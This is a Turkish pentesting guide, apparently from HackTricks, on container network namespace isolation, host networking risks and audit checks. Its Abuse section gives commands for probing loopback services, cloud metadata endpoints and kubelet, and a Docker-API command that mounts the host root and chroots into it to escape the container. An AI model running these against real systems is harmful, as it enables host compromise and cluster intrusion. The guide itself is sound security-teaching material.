# Ağ Namespace'i

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Ağ namespace'i; arayüzler, IP adresleri, yönlendirme tabloları, ARP/neighbor durumu, firewall kuralları, socket'ler, UNIX-domain abstract socket namespace'i ve `/proc/net` gibi dosyaların içerikleri gibi ağla ilgili kaynakları izole eder. Bir container'ın host'un gerçek ağ stack'ine sahip olmadan kendi `eth0` arayüzüne, kendi yerel rotalarına ve kendi loopback cihazına sahipmiş gibi görünmesinin nedeni budur.

Güvenlik açısından bu önemlidir; çünkü ağ izolasyonu port binding işleminden çok daha fazlasını kapsar. Private bir ağ namespace'i, workload'un doğrudan neleri gözlemleyebileceğini veya yeniden yapılandırabileceğini sınırlar. Bu namespace host ile paylaşıldığında container, host listener'larını, host-local servislerini, abstract AF_UNIX endpoint'lerini ve uygulamaya açılması hiç amaçlanmamış ağ kontrol noktalarını bir anda görebilir.

## Çalışma

Yeni oluşturulan bir ağ namespace'i, arayüzler kendisine bağlanana kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Container runtime'ları daha sonra virtual interface'ler oluşturur veya bunlara bağlanır, adresler atar ve workload'un beklenen bağlantıya sahip olması için rotaları yapılandırır. Bridge tabanlı deployment'larda bu genellikle container'ın host bridge'ine bağlı, veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te CNI plugin'leri, Pod networking için eşdeğer kurulumu gerçekleştirir.

Bu architecture, `--network=host` veya `hostNetwork: true` seçeneklerinin neden bu kadar büyük bir değişiklik olduğunu açıklar. Workload, hazırlanmış private bir ağ stack'i almak yerine doğrudan host'un gerçek ağına katılır.

## Lab

Şu komutla neredeyse boş bir ağ namespace'i görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ayrıca normal ve host-networked container'ları şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-networked container artık kendi izole socket ve interface görünümüne sahip değildir. Bu değişiklik, process'in hangi capabilities değerlerine sahip olduğunu sormadan önce bile başlı başına önemlidir.

## Runtime Kullanımı

Docker ve Podman, aksi yapılandırılmadığı sürece normalde her container için private bir network namespace oluşturur. Kubernetes genellikle her Pod'a, o Pod içindeki container'lar arasında paylaşılan ancak host'tan ayrı olan kendi network namespace'ini verir. Bu nedenle `127.0.0.1` genellikle container-local değil, Pod-local'dır: yalnızca localhost'a bind edilmiş bir listener'a aynı Pod içindeki sidecar'lar ve kardeş container'lar genellikle erişebilir. Incus/LXC sistemleri de zengin network namespace tabanlı isolation sağlar ve çoğu zaman daha geniş çeşitlilikte virtual networking kurulumu sunar.

Yaygın ilke, private networking'in varsayılan isolation sınırı, host networking'in ise bu sınırdan açıkça vazgeçme olmasıdır.

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma, host network namespace'ini paylaşmaktır. Bu bazen performance, low-level monitoring veya convenience amacıyla yapılır; ancak container'lar için mevcut en temiz sınırlardan birini ortadan kaldırır. Host-local listener'lara daha doğrudan erişilebilir hâle gelir, yalnızca localhost'a açık servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi capabilities çok daha tehlikeli olur; çünkü bunların etkinleştirdiği işlemler artık host'un kendi network ortamına uygulanır.

Bir diğer sorun, network namespace private olsa bile network ile ilgili capabilities değerlerinin gereğinden fazla verilmesidir. Private namespace yardımcı olur, ancak raw socket'ları veya gelişmiş network control işlemlerini zararsız hâle getirmez.

Kubernetes'te `hostNetwork: true`, Pod-level network segmentation'a ne ölçüde güvenebileceğinizi de değiştirir. Kubernetes, birçok network plugin'inin `podSelector` / `namespaceSelector` eşleştirmesi için `hostNetwork` Pod trafiğini düzgün biçimde ayırt edemediğini ve bu trafiği bu nedenle ordinary node traffic olarak değerlendirdiğini belirtir. Bir attacker açısından bu, ele geçirilmiş bir `hostNetwork` workload'un çoğu zaman overlay-network workload'larıyla aynı policy varsayımları tarafından kısıtlanan normal bir Pod yerine node-level network foothold olarak ele alınması gerektiği anlamına gelir.

## Abuse

Isolation'ın zayıf olduğu kurulumlarda attacker'lar host üzerindeki listening servislerini inceleyebilir, yalnızca loopback'e bind edilmiş management endpoint'lerine erişebilir, kesin capabilities ve ortama bağlı olarak trafiği sniff edebilir veya trafiğe müdahale edebilir; ayrıca `CAP_NET_ADMIN` mevcutsa routing ve firewall state'i yeniden yapılandırabilir. Bir cluster içinde bu durum lateral movement ve control-plane reconnaissance işlemlerini de kolaylaştırabilir.

Host networking'den şüpheleniyorsanız, visible interface'ların ve listener'ların isolated bir container network'üne değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Yalnızca loopback üzerinde çalışan servisler genellikle ilk ilgi çekici keşiftir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX socket'leri, TCP/UDP listener'ları gibi görünmedikleri ve `/run` altında filesystem path'leri olarak mevcut olmayabilecekleri için gözden kaçırılması kolay başka bir hedeftir. Bu nedenle host-network kullanan bir container, container'a hiç bind-mount edilmemiş host'a özel control channel'lara erişimi devralabilir:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Tarihsel bir örnek, `containerd-shim` abstract-socket exposure bug'ıydı; ancak daha geniş ders, belirli CVE'den daha önemlidir: Bir workload host network namespace'e katıldığında, abstract AF_UNIX servisleri de attack surface'ın parçası hâline gelir. Bu socket'ler runtime ile ilişkili veya administrative görünüyorsa [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)'a pivot edin.

Network capabilities mevcutsa, workload'un görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Modern kernel'lerde host networking ile birlikte `CAP_NET_ADMIN`, basit `iptables` / `nftables` değişikliklerinin ötesinde paket yolunu da açığa çıkarabilir. `tc` qdisc'leri ve filtreleri de namespace kapsamındadır; dolayısıyla paylaşılan bir host network namespace'inde bunlar container'ın görebildiği host arayüzlerine uygulanır. Ayrıca `CAP_BPF` mevcutsa, TC ve XDP loader'ları gibi network ile ilgili eBPF programları da önem kazanır:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Bu önemlidir; çünkü bir attacker, yalnızca firewall kurallarını yeniden yazmakla kalmayıp host interface düzeyinde trafiği mirror edebilir, redirect edebilir, şekillendirebilir veya düşürebilir. Private network namespace içinde bu eylemler container görünümüyle sınırlıdır; paylaşılan host namespace içinde ise host'u etkiler hâle gelir.

Cluster veya cloud ortamlarında host networking, metadata ve control-plane'e yakın servisler için hızlı bir local recon yapılmasını da haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes'te, çok konteynerli bir Pod'da **herhangi bir** container'ın ele geçirilmesinin, kardeş container'lar ve sidecar'lar tarafından açılan localhost listener'larına da erişim sağladığını unutmayın; bunun nedeni tüm Pod'un tek bir network namespace paylaşmasıdır. Bu durum, admin veya debug arayüzleri cluster genelinde değil, kasıtlı olarak Pod içinde erişilebilir olacak şekilde yapılandırılan service-mesh, observability ve yardımcı container'lar açısından özellikle önemlidir:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"localhost'a bağlı" ifadesini **Pod-private**, **container-private** olarak değil, kabul edin. Pod içindeki bir container ele geçirildikten sonra bu varsayım geçerliliğini yitirir.

### Full Example: Host Networking + Local Runtime / Kubelet Access

Host networking otomatik olarak host root erişimi sağlamaz; ancak çoğu zaman yalnızca node'un kendisinden erişilebilir olması amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf şekilde korunuyorsa host networking, doğrudan bir privilege-escalation yolu hâline gelir.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost üzerindeki Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etki:

- uygun koruma olmadan yerel bir runtime API açığa çıkarsa doğrudan host compromise
- kubelet veya yerel agent'lara erişilebiliyorsa cluster keşfi veya lateral movement
- `CAP_NET_ADMIN` ile birlikte kullanıldığında traffic manipulation veya denial of service

## Kontroller

Bu kontrollerin amacı, process'in private network stack'e sahip olup olmadığını, hangi route'ların ve listener'ların görünür olduğunu ve capability'leri test etmeden önce network görünümünün host benzeri olup olmadığını öğrenmektir.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Burada ilginç olanlar:

- `/proc/self/ns/net` ve `/proc/1/ns/net` zaten host benzeri görünüyorsa container, host network namespace'ini veya başka bir private olmayan namespace'i paylaşıyor olabilir.
- Shell zaten adlandırılmış ya da kalıcı bir namespace içindeyse ve bunu host tarafındaki `/run/netns` nesneleriyle ilişkilendirmek istiyorsanız `lsns -t net` ve `ip netns identify` kullanışlıdır.
- `ss -lntup` özellikle değerlidir; çünkü yalnızca loopback üzerinde dinleyen listener'ları ve yerel yönetim endpoint'lerini ortaya çıkarır. `ss -xap` ve `/proc/net/unix`, normal filesystem socket aramalarının kaçırdığı abstract-socket görünümünü tamamlar.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` veya `CAP_BPF` mevcutsa route'lar, interface adları, firewall context'i, `tc` durumu ve eBPF attachment'ları çok daha önemli hâle gelir.
- Kubernetes'te `hostNetwork` kullanan bir Pod'da service-name resolution başarısız oluyorsa bunun nedeni Pod'un `dnsPolicy: ClusterFirstWithHostNet` kullanmaması olabilir; service'in mevcut olmadığı anlamına gelmeyebilir.
- Multi-container Pod'larda localhost listener'ları tüm Pod network namespace'ine aittir. Bu nedenle yalnızca loopback üzerinde dinleyen bir portun compromised container'dan erişilemez olduğunu varsaymadan önce sidecar'ları ve sibling container'ları kontrol edin.

Bir container'ı incelerken network namespace'ini her zaman capability set'iyle birlikte değerlendirin. Host networking ile güçlü network capabilities kullanılması, bridge networking ile dar bir default capability set'inin kullanılmasından tamamen farklı bir security posture oluşturur.

## Referanslar

- [Kubernetes NetworkPolicy ve `hostNetwork` ile ilgili dikkat edilmesi gerekenler](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` ve abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network container'lara açık abstract Unix domain socket'leri](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Network-related eBPF program'ları için eBPF token ve capability gereksinimleri](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
